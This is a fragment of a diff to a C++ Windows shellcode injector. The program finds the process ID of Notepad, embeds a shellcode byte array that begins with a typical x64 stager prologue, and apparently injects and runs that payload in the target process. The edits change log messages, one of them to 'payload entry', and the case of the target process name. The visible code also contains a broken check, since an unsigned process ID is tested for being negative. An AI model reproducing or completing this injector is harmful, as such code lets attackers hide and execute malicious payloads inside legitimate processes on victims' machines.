@@ -9,6 +9,7 @@ DWORD GetProcessID(const wstring& processName) {
     DWORD processID = 0;
     HANDLE hProcSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hProcSnapshot == INVALID_HANDLE_VALUE) {
+		cerr << "INVALID_HANDLE_VALUE\n";
         return 0;
     }
 
@@ -36,7 +37,7 @@ int main(int argc, char** argv) {
 			debug = true;
 		}
 	}
-	cout << "main\n";
+	cout << "payload entry\n";
 
 	unsigned char shellcode[] = 
 		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
@@ -76,7 +77,7 @@ int main(int argc, char** argv) {
 	
 	
 	
-	DWORD pid = GetProcessID(L"notepad.exe");
+	DWORD pid = GetProcessID(L"Notepad.exe");
 
 	
 	if(pid < 0){
@@ -171,8 +172,4 @@ int main(int argc, char** argv) {
 	CloseHandle(hProc);
 
 	return 0;
-
-
-
-
 }
